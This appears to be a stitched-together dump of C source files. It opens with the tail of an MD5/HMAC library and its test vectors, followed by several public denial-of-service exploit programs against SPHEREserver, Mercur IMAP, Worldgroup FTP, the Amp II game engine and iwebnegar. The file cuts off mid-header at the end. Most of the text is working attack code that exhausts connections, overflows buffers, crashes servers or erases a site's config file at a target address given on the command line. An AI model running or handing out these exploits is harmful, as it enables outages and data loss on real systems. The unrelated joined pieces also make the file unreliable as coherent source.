    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
};

/*
 * MD5 final digest
 */
void md5_finish( md5_context *ctx, unsigned char output[16] )
{
    unsigned long last, padn;
    unsigned long high, low;
    unsigned char msglen[8];

    high = ( ctx->total[0] >> 29 )
         | ( ctx->total[1] <<  3 );
    low  = ( ctx->total[0] <<  3 );

    PUT_ULONG_LE( low,  msglen, 0 );
    PUT_ULONG_LE( high, msglen, 4 );

    last = ctx->total[0] & 0x3F;
    padn = ( last < 56 ) ? ( 56 - last ) : ( 120 - last );

    md5_update( ctx, (unsigned char *) md5_padding, padn );
    md5_update( ctx, msglen, 8 );

    PUT_ULONG_LE( ctx->state[0], output,  0 );
    PUT_ULONG_LE( ctx->state[1], output,  4 );
    PUT_ULONG_LE( ctx->state[2], output,  8 );
    PUT_ULONG_LE( ctx->state[3], output, 12 );
}

/*
 * output = MD5( input buffer )
 */
void md5( const unsigned char *input, int ilen, unsigned char output[16] )
{
    md5_context ctx;

    md5_starts( &ctx );
    md5_update( &ctx, input, ilen );
    md5_finish( &ctx, output );

    memset( &ctx, 0, sizeof( md5_context ) );
}

/*
 * output = MD5( file contents )
 */
int md5_file( const char *path, unsigned char output[16] )
{
    FILE *f;
    size_t n;
    md5_context ctx;
    unsigned char buf[1024];

    if( ( f = fopen( path, "rb" ) ) == NULL )
        return( 1 );

    md5_starts( &ctx );

    while( ( n = fread( buf, 1, sizeof( buf ), f ) ) > 0 )
        md5_update( &ctx, buf, (int) n );

    md5_finish( &ctx, output );

    memset( &ctx, 0, sizeof( md5_context ) );

    if( ferror( f ) != 0 )
    {
        fclose( f );
        return( 2 );
    }

    fclose( f );
    return( 0 );
}

/*
 * MD5 HMAC context setup
 */
void md5_hmac_starts( md5_context *ctx, const unsigned char *key, int keylen )
{
    int i;
    unsigned char sum[16];

    if( keylen > 64 )
    {
        md5( key, keylen, sum );
        keylen = 16;
        key = sum;
    }

    memset( ctx->ipad, 0x36, 64 );
    memset( ctx->opad, 0x5C, 64 );

    for( i = 0; i < keylen; i++ )
    {
        ctx->ipad[i] = (unsigned char)( ctx->ipad[i] ^ key[i] );
        ctx->opad[i] = (unsigned char)( ctx->opad[i] ^ key[i] );
    }

    md5_starts( ctx );
    md5_update( ctx, ctx->ipad, 64 );

    memset( sum, 0, sizeof( sum ) );
}

/*
 * MD5 HMAC process buffer
 */
void md5_hmac_update( md5_context *ctx, const unsigned char *input, int ilen )
{
    md5_update( ctx, input, ilen );
}

/*
 * MD5 HMAC final digest
 */
void md5_hmac_finish( md5_context *ctx, unsigned char output[16] )
{
    unsigned char tmpbuf[16];

    md5_finish( ctx, tmpbuf );
    md5_starts( ctx );
    md5_update( ctx, ctx->opad, 64 );
    md5_update( ctx, tmpbuf, 16 );
    md5_finish( ctx, output );

    memset( tmpbuf, 0, sizeof( tmpbuf ) );
}

/*
 * MD5 HMAC context reset
 */
void md5_hmac_reset( md5_context *ctx )
{
    md5_starts( ctx );
    md5_update( ctx, ctx->ipad, 64 );
}

/*
 * output = HMAC-MD5( hmac key, input buffer )
 */
void md5_hmac( const unsigned char *key, int keylen,
               const unsigned char *input, int ilen,
               unsigned char output[16] )
{
    md5_context ctx;

    md5_hmac_starts( &ctx, key, keylen );
    md5_hmac_update( &ctx, input, ilen );
    md5_hmac_finish( &ctx, output );

    memset( &ctx, 0, sizeof( md5_context ) );
}

#if defined(POLARSSL_SELF_TEST)
/*
 * RFC 1321 test vectors
 */
static unsigned char md5_test_buf[7][81] =
{
    { "" }, 
    { "a" },
    { "abc" },
    { "message digest" },
    { "abcdefghijklmnopqrstuvwxyz" },
    { "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" },
    { "12345678901234567890123456789012345678901234567890123456789012" \
      "345678901234567890" }
};

static const int md5_test_buflen[7] =
{
    0, 1, 3, 14, 26, 62, 80
};

static const unsigned char md5_test_sum[7][16] =
{
    { 0xD4, 0x1D, 0x8C, 0xD9, 0x8F, 0x00, 0xB2, 0x04,
      0xE9, 0x80, 0x09, 0x98, 0xEC, 0xF8, 0x42, 0x7E },
    { 0x0C, 0xC1, 0x75, 0xB9, 0xC0, 0xF1, 0xB6, 0xA8,
      0x31, 0xC3, 0x99, 0xE2, 0x69, 0x77, 0x26, 0x61 },
    { 0x90, 0x01, 0x50, 0x98, 0x3C, 0xD2, 0x4F, 0xB0,
      0xD6, 0x96, 0x3F, 0x7D, 0x28, 0xE1, 0x7F, 0x72 },
    { 0xF9, 0x6B, 0x69, 0x7D, 0x7C, 0xB7, 0x93, 0x8D,
      0x52, 0x5A, 0x2F, 0x31, 0xAA, 0xF1, 0x61, 0xD0 },
    { 0xC3, 0xFC, 0xD3, 0xD7, 0x61, 0x92, 0xE4, 0x00,
      0x7D, 0xFB, 0x49, 0x6C, 0xCA, 0x67, 0xE1, 0x3B },
    { 0xD1, 0x74, 0xAB, 0x98, 0xD2, 0x77, 0xD9, 0xF5,
      0xA5, 0x61, 0x1C, 0x2C, 0x9F, 0x41, 0x9D, 0x9F },
    { 0x57, 0xED, 0xF4, 0xA2, 0x2B, 0xE3, 0xC9, 0x55,
      0xAC, 0x49, 0xDA, 0x2E, 0x21, 0x07, 0xB6, 0x7A }
};

/*
 * RFC 2202 test vectors
 */
static unsigned char md5_hmac_test_key[7][26] =
{
    { "\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B\x0B" },
    { "Jefe" },
    { "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA" },
    { "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"
      "\x11\x12\x13\x14\x15\x16\x17\x18\x19" },
    { "\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C" },
    { "" }, /* 0xAA 80 times */
    { "" }
};

static const int md5_hmac_test_keylen[7] =
{
    16, 4, 16, 25, 16, 80, 80
};

static unsigned char md5_hmac_test_buf[7][74] =
{
    { "Hi There" },
    { "what do ya want for nothing?" },
    { "\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD"
      "\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD"
      "\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD"
      "\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD"
      "\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD" },
    { "\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD"
      "\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD"
      "\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD"
      "\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD"
      "\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD" },
    { "Test With Truncation" },
    { "Test Using Larger Than Block-Size Key - Hash Key First" },
    { "Test Using Larger Than Block-Size Key and Larger"
      " Than One Block-Size Data" }
};

static const int md5_hmac_test_buflen[7] =
{
    8, 28, 50, 50, 20, 54, 73
};

static const unsigned char md5_hmac_test_sum[7][16] =
{
    { 0x92, 0x94, 0x72, 0x7A, 0x36, 0x38, 0xBB, 0x1C,
      0x13, 0xF4, 0x8E, 0xF8, 0x15, 0x8B, 0xFC, 0x9D },
    { 0x75, 0x0C, 0x78, 0x3E, 0x6A, 0xB0, 0xB5, 0x03,
      0xEA, 0xA8, 0x6E, 0x31, 0x0A, 0x5D, 0xB7, 0x38 },
    { 0x56, 0xBE, 0x34, 0x52, 0x1D, 0x14, 0x4C, 0x88,
      0xDB, 0xB8, 0xC7, 0x33, 0xF0, 0xE8, 0xB3, 0xF6 },
    { 0x69, 0x7E, 0xAF, 0x0A, 0xCA, 0x3A, 0x3A, 0xEA,
      0x3A, 0x75, 0x16, 0x47, 0x46, 0xFF, 0xAA, 0x79 },
    { 0x56, 0x46, 0x1E, 0xF2, 0x34, 0x2E, 0xDC, 0x00,
      0xF9, 0xBA, 0xB9, 0x95 },
    { 0x6B, 0x1A, 0xB7, 0xFE, 0x4B, 0xD7, 0xBF, 0x8F,
      0x0B, 0x62, 0xE6, 0xCE, 0x61, 0xB9, 0xD0, 0xCD },
    { 0x6F, 0x63, 0x0F, 0xAD, 0x67, 0xCD, 0xA0, 0xEE,
      0x1F, 0xB1, 0xF5, 0x62, 0xDB, 0x3A, 0xA5, 0x3E }
};

/*
 * Checkup routine
 */
int md5_self_test( int verbose )
{
    int i, buflen;
    unsigned char buf[1024];
    unsigned char md5sum[16];
    md5_context ctx;

    for( i = 0; i < 7; i++ )
    {
        if( verbose != 0 )
            printf( "  MD5 test #%d: ", i + 1 );

        md5( md5_test_buf[i], md5_test_buflen[i], md5sum );

        if( memcmp( md5sum, md5_test_sum[i], 16 ) != 0 )
        {
            if( verbose != 0 )
                printf( "failed\n" );

            return( 1 );
        }

        if( verbose != 0 )
            printf( "passed\n" );
    }

    if( verbose != 0 )
        printf( "\n" );

    for( i = 0; i < 7; i++ )
    {
        if( verbose != 0 )
            printf( "  HMAC-MD5 test #%d: ", i + 1 );

        if( i == 5 || i == 6 )
        {
            memset( buf, '\xAA', buflen = 80 );
            md5_hmac_starts( &ctx, buf, buflen );
        }
        else
            md5_hmac_starts( &ctx, md5_hmac_test_key[i],
                                   md5_hmac_test_keylen[i] );

        md5_hmac_update( &ctx, md5_hmac_test_buf[i],
                               md5_hmac_test_buflen[i] );

        md5_hmac_finish( &ctx, md5sum );

        buflen = ( i == 4 ) ? 12 : 16;

        if( memcmp( md5sum, md5_hmac_test_sum[i], buflen ) != 0 )
        {
            if( verbose != 0 )
                printf( "failed\n" );

            return( 1 );
        }

        if( verbose != 0 )
            printf( "passed\n" );
    }

    if( verbose != 0 )
        printf( "\n" );

    return( 0 );
}

#endif

#endif
source: http://www.securityfocus.com/bid/4258/info

Menasoft SPHEREserver .99 is an online role playing game server. It is vulnerable to a denial of service; multiple connections to the server can be made from a single machine, exhausting available connections and denying connections to legitimate users.

/*
 *
 * www.h07.org
 * H Zero Seven
 * Unix Security Research Team
 *
 * Sphere Ultima Online Server - Denial of Service Vulnerability
 * poc-exploit...
 *
 * Simple code to eat all connections from the gameserver, so other
 * peoples could not connect to the server.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <time.h>
#include <sys/time.h>

int Connect(int ip, int port)
{
   int fd;
   struct sockaddr_in tgt;

   fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   if (fd<0) return -1;
   memset(&tgt,0,sizeof(struct sockaddr_in));
   tgt.sin_port = htons(port);
   tgt.sin_family = AF_INET;
   tgt.sin_addr.s_addr = ip;
   if (connect(fd,(struct sockaddr*)&tgt,sizeof(struct sockaddr))<0)
return -1;
   return fd;
}

int sprint(int fd, const char *str,...)
{
   va_list args;
   char buf[4096];
   memset(&buf,0,sizeof(buf));
   va_start(args,str);
   vsnprintf(buf,sizeof(buf),str,args);
   return(write(fd,buf,strlen(buf)));
}

int main(int argc, char *argv[])
{
   int fd;
   struct sockaddr_in box;

   fprintf(stderr, "SphereServer DoS Exploit [poc]\n");
   fprintf(stderr, "H Zero Seven - Unix Security Research Team -
www.h07.org\n\n");
   if (argc < 2) {
      fprintf(stderr, "usage: %s <sphere ip> [sphere port]\n",argv[0]);
      return;
   }

   fprintf(stderr,"for the full advisory regarding this vulnerability
visit www.h07.org ... \n");
   fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   if (fd<0) {
      perror("socket() ");
      return;
   }

   fprintf(stderr,"Attacking sphere : ");
   for (;;) {
      int sock;

      sock = Connect(inet_addr(argv[1]),(argc>2)?(atoi(argv[2])):3128);
      if (sock<0) {
         sleep(10);
         continue;
      }
       fprintf(stderr, ".*");
   }
}
/**
Exploit for : IMAP 5.0 SP3 DoS Exploit
Advisory    : http://secunia.com/advisories/19267/
Coder       : Omnipresent
Email       : omnipresent@email.it
Description : Tim Taylor has discovered a vulnerability in Mercur Messaging 2005, which can be exploited by malicious people and by malicious users to cause a DoS (Denial of Service) or to compromise a vulnerable system.

              The vulnerability is caused due to boundary errors within the handling of IMAP commands. This can be exploited to cause a stack-based buffer overflow via overly long arguments passed to the LOGIN and SELECT commands. Other commands may also be affected.

              Successful exploitation allows arbitrary code execution.

              The vulnerability has been confirmed in version 5.0 SP3. Other versions may also be affected.
**/




#ifdef _WIN32
        #include <winsock2.h>

        SOCKET sock;
        WSADATA wsaData;
        WORD wVersionRequested;

#else
        #include <sys/socket.h>
        #include <netinet/in.h>
        #define INVALID_SOCKET -1
        #define SOCKET_ERROR -1

        int sock;
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
   char buf[280];
   struct sockaddr_in saddr;
   unsigned long ip;
   int i;

   if (argc != 2)
   {
    printf("IMAP 5.0 SP3 - DoS Exploit!\r\n");
    printf("Coded by OmniPresent - omnipresent@email.it\r\n");
    printf("IMAP 5.0 SP3 - DoS Exploit!\r\n");
    printf("Advisory: http://secunia.com/advisories/19267/\r\n");
   	printf("%s <IP_Address>\r\n", argv[0]);
    
	exit(1);
   }
	
   ip = inet_addr(argv[1]);

#ifdef _WIN32
   wVersionRequested = MAKEWORD(2, 2);
   if (WSAStartup(wVersionRequested, &wsaData) < 0)
   {
      printf("Unable to initialise Winsock\r\n");
      exit(1);
   }
#endif
 

   if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
   {
      printf("Socket Error \n");
      exit(1);
   }


   memset(&saddr,'0', sizeof(saddr));
   saddr.sin_port = htons(143);
   saddr.sin_family = AF_INET;
   memcpy(&saddr.sin_addr, (unsigned long *)&ip, sizeof((unsigned long *)&ip));

   if (connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)) == SOCKET_ERROR)
   {
      printf("Connect Error \n");
      exit(1);
   }

   for (i=0; i<278; i++) {
      buf[i] = 'A';
   }
   strcat(buf, "\r\n");
  

   send(sock, buf, sizeof(buf), 0);
   
 #ifdef _WIN32
 closesocket(sock);
 #else
 close(sock);
 #endif
 printf("DoS Attack Done!\n");
}

// milw0rm.com [2006-03-19]
source: http://www.securityfocus.com/bid/4185/info


Galacticomm Worldgroup is a community building package of both client and server software for Microsoft Windows. Worldgroup is based on BBS software, and includes web and ftp servers.

A vulnerability has been reported in the FTP server included with Worldgroup. If a LIST command is received by the server including a long string of '*/../' characters, the server may halt. A restart may be required in order to regain normal functionality.

Earlier versions of Worldgroup may share this vulnerability. 

/*
        by Limpid Byte project
        http://lbyte.void.ru
        lbyte@host.sk

[Worldgroup FTP Server Denial of Service]
More than 105 "/" in LIST command.

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>

#define FOUND "220"

int main(int argc, char *argv[])
{
        int sock;
        struct sockaddr_in blah;
        struct hostent *he;
        char cgiBuff[1024];
        char *cgiPage[6];
        WSADATA wsaData;
        char cr[] = "\n";

        if (argc < 3)
        {
printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThis program crash Worldgroup servers 3.xx for windows 95/98/ME/NT/2K.");
printf("\n\rGreets to [WhU]//[GiN]//[LByte]//[WGHACK] projects!\n\r  USAGE:\n\r");
printf("Ftp_dos.exe [HOST] [LOGIN] [PASSWORD] ");
printf("\n\r example : fpt_dos.exe 127.0.0.1 anonymous anonymous@127.0.0.1 \n");
                exit(1);
        }
        cgiPage[0] = "USER ";
        cgiPage[1] = (argv[2]);
        cgiPage[2] = "PASS ";
        cgiPage[3] = (argv[3]);
        cgiPage[4] = "PASV";
        cgiPage[5] = "LIST */../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../\n";

        if(WSAStartup(0x101,&wsaData))
        {
                printf("Unable to initialize WinSock lib.\n");
                exit(1);
        }
printf("Let's crash the World!\n\r");
printf("Coded by the [eaSt]:\n\r");
printf("\nConnecting %s on port 21...\n\n", argv[1]);

        sock = socket(AF_INET,SOCK_STREAM,0);
        blah.sin_family=AF_INET;
        blah.sin_addr.s_addr=inet_addr(argv[1]);
        blah.sin_port=htons(21);
        if ((he = gethostbyname(argv[1])) != NULL)
        {
                memcpy((char *)&blah.sin_addr, he->h_addr, he->h_length);
        }
        else
        {
                if ((blah.sin_addr.s_addr = inet_addr(argv[1]))==INADDR_NONE)
                {
                WSACleanup();
                exit(1);
                }
        }

        if (connect(sock,(struct sockaddr*)&blah,sizeof(blah))!=0)
        {
                WSACleanup();
                exit(1);
        }
        memset(cgiBuff, 0, sizeof(cgiBuff));
        cgiBuff[recv(sock,cgiBuff,sizeof(cgiBuff) - 1 ,0)] = 0;
        printf("<< %s", cgiBuff);
        send(sock,cgiPage[0],strlen(cgiPage[0]),0);
        send(sock,cgiPage[1],strlen(cgiPage[1]),0);
        send(sock,cr,1,0);
        memset(cgiBuff, 0, sizeof(cgiBuff));
        cgiBuff[recv(sock,cgiBuff,sizeof(cgiBuff) - 1 ,0)] = 0;
        printf(">> %s %s\n<< %s", cgiPage[0], cgiPage[1], cgiBuff);
        send(sock,cgiPage[2],strlen(cgiPage[2]),0);
        send(sock,cgiPage[3],strlen(cgiPage[3]),0);
        send(sock,cr,1,0);
        memset(cgiBuff, 0, sizeof(cgiBuff));
        cgiBuff[recv(sock,cgiBuff,sizeof(cgiBuff) - 1 ,0)] = 0;
        printf(">> %s %s\n<< %s", cgiPage[2], cgiPage[3], cgiBuff);
        send(sock,cgiPage[4],strlen(cgiPage[4]),0);
        send(sock,cr,1,0);
        memset(cgiBuff, 0, sizeof(cgiBuff));
        cgiBuff[recv(sock,cgiBuff,sizeof(cgiBuff) - 1 ,0)] = 0;
        printf(">> %s\n<< %s", cgiPage[4], cgiBuff);
        send(sock,cgiPage[5],strlen(cgiPage[5]),0);
        send(sock,cr,1,0);
        memset(cgiBuff, 0, sizeof(cgiBuff));
        cgiBuff[recv(sock,cgiBuff,sizeof(cgiBuff) - 1 ,0)] = 0;
        printf(">> %s\n<< %s", cgiPage[5], cgiBuff);

        printf("Try reconnect to %s\n", argv[1]);
        WSACleanup();
        return 0;
}
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
/* winerr.h + amp2zero.c / str0ke@milw0rm.com */
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER     "0.1"
#define BUFFSZ  2048
#define PORT    27777
#define TIMEOUT 3
#define ZERO    ""  // 0 bytes, a cool bug

#define SEND(x) if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                  < 0) std_err();



int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            outoftime = 0;
    u_short port = PORT;
    u_char  buff[BUFFSZ],
            check[] =
                "\x02\x00\x0F\x00"
                "\x01"                              /* 1 = clear, 3 = password */
                "\x00\x00\x00\x00\x00\x00\x00\x00"; /* password */


    setbuf(stdout, NULL);

    fputs("\n"
        "Amp II engine (Gore <= 1.50) socket unreacheable "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    fputs("- check if server is online\n", stdout);
    SEND(check);
    if(timeout(sd) < 0) {
        fputs("- alert: socket timeout, no reply received but I continue\n", stdout);
        outoftime = 1;
    } else {
        len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
        if(len < 0) std_err();
        if(*buff != 0x02) {
            fputs("- server doesn't seem a valid Gore server, I continue\n", stdout);
        }
    }

    fputs("- send a ZERO bytes packet\n", stdout);
    SEND(ZERO);

    if(outoftime) {
        fputs("- now you must check the server manually\n\n", stdout);
    } else {
        fputs("- wait one second\n", stdout);
        sleep(ONESEC);

        fputs("- check if the server is vulnerable:\n", stdout);
        SEND(check);

        if(timeout(sd) < 0) {
            fputs("\nServer IS vulnerable!!!\n\n", stdout);
        } else {
            fputs("\nServer doesn't seem vulnerable\n\n", stdout);
        }
    }

    close(sd);
    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}




#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2005-01-06]
/*
    iwebnegar 1.1 remote exploit
    c0ded by root / c0d3r " kaveh razavi ": c0d3rz_team@yahoo.com
        bug found by " hossein asgary " in simorgh-ev security team ( u rux hossein )
        compile with Ms visual C++ (the php version written by the bug finder but still priv8)
        greetz : LorD & NT from IHS , vbehzadan & sIiiS from hyper-security.com ,
        Jamie & Ben from exploitdev .
        Lamer : shervin_kesafat@yahoo.com ( who can fuck him ? )
  */
  /* there is a limited buffer in the php code of iwebnegar when u overflow it , it will
      go to Die() functions which cause the erase of config.php
  */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define size 300

 

int main (int argc, char *argv[]){



 char req[] =
          "GET /admin/conf_edit.php?";
  unsigned int rc,addr,sock ;
  struct sockaddr_in tcp;
  struct hostent * hp;
  WSADATA wsaData;
char buffer[size];

   memset(buffer,'A',300);
   memcpy(buffer,req,25);

                if(argc < 2) {
                printf("\nusage : iwebnegar host\n");
                printf("example : iwebnegar.exe 127.0.0.1\n");
                exit(-1) ;
        }
  
  if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0){
   printf("WSAStartup failed !\n");
   exit(-1);
  }
        hp = gethostbyname(argv[1]);
  if (!hp){
   addr = inet_addr(argv[1]);
  }
  if ((!hp) && (addr == INADDR_NONE) ){
   printf("Unable to resolve %s\n",argv[1]);
   exit(-1);
  }
  sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if (!sock){
   printf("socket() error...\n");
   exit(-1);
  }
          if (hp != NULL)
   memcpy(&(tcp.sin_addr),hp->h_addr,hp->h_length);
  else
   tcp.sin_addr.s_addr = addr;

  if (hp)
   tcp.sin_family = hp->h_addrtype;
  else
   tcp.sin_family = AF_INET;

  tcp.sin_port=htons(80);
  
  printf("\n[+] attacking host %s\n" , argv[1]) ;
  printf("[+] Building overflow string\n");
  Sleep(1000);
  printf("[+] packet size = %d byte\n" , sizeof(buffer));
  rc=connect(sock, (struct sockaddr *) &tcp, sizeof (struct sockaddr_in));
  if(rc==0)
  {
    
        Sleep(1000) ;
         printf("[+] connected\n") ;
         
         send(sock , buffer , sizeof(buffer) , 0);
        
         printf("[+] see if the config.php erased ! \n\n") ;
             
        }
  else {
  printf("the 80 port is not open try another webserver port\n");
 

  }
}

// milw0rm.com [2005-01-04]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
